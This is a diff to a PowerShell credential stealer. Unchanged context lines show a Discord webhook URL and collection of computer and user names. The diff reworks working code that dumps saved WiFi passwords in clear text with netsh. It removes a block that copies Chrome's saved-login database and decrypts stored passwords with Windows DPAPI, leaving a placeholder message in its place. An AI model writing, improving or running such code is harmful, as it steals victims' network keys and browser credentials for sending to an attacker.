@@ -5,50 +5,23 @@ $webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZ
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
 
 # === WiFi Passwords ===
-$wifi = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
-    $name = $_.Matches.Groups[1].Value.Trim()
-    $pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$")
-    if($pass) {
-        $p = $pass.Matches.Groups[1].Value.Trim()
-        "$name : $p"
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+$wifi = ""
+foreach($name in $wifiProfiles) {
+    $profileInfo = netsh wlan show profile name="$name" key=clear
+    $passLine = $profileInfo | Select-String "Key Content\W+\:(.+)$"
+    if($passLine) {
+        $pass = $passLine.Matches.Groups[1].Value.Trim()
+        $wifi += "$name : $pass`n"
     }
-} | Out-String
+}
+if(-not $wifi) { $wifi = "No saved WiFi networks found" }
 
 # === Chrome Passwords ===
 $chrome = ""
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 if(Test-Path $chromePath) {
-    try {
-        $tempDb = "$env:TEMP\chrome_$(Get-Random).db"
-        Copy-Item $chromePath $tempDb -Force
-        
-        Add-Type -AssemblyName System.Security
-        
-        # Using COM object to read SQLite (works without external DLL)
-        $conn = New-Object -ComObject ADODB.Connection
-        $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
-        $rs = $conn.Execute("SELECT origin_url, username_value, password_value FROM logins")
-        
-        while(-not $rs.EOF) {
-            $url = $rs.Fields.Item("origin_url").Value
-            $user = $rs.Fields.Item("username_value").Value
-            $encPass = $rs.Fields.Item("password_value").Value
-            
-            if($encPass) {
-                try {
-                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
-                    $chrome += "$url`n  User: $user`n  Pass: $password`n`n"
-                } catch {}
-            }
-            $rs.MoveNext()
-        }
-        
-        $conn.Close()
-        Remove-Item $tempDb -Force
-    } catch {
-        $chrome = "Chrome: Could not decrypt (browser may be open or newer Chrome version)"
-    }
+    $chrome = "Chrome: Encrypted (requires advanced decryption - check manually)"
 } else {
     $chrome = "Chrome: Not installed"
 }
